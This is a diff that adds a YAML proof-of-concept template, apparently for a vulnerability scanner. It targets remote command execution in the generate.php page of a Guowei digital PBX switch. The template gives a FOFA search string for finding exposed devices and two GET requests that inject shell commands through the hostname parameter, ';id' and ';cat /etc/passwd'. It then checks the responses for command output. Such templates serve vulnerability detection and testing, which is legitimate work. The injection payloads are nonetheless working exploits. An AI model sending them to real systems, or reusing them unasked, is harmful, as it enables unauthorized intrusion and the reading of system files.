@@ -1,0 +1,19 @@
+id: poc-yaml-gw-dpcte-generate-php-rce
+info:
+  name: 国威数字程控交换机 generate.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 国威数字程控交换机
+  fofa: body="themes/tenant/css/login.css"
+requests:
+- method: GET
+  path: /modules/ping/generate.php?send=Ping&hostname=;id
+  expression: status_code == 200 && contains(body,"uid=") && contains(body,"gid=")
+    && contains(body,"<")
+- method: GET
+  path: /modules/ping/generate.php?send=Ping&hostname=;cat%20/etc/passwd
+  expression: status_code == 200 && contains(body,"root") && contains(body,"/bin")
+    && contains(body,"<")
+variables: {}
+transport: http
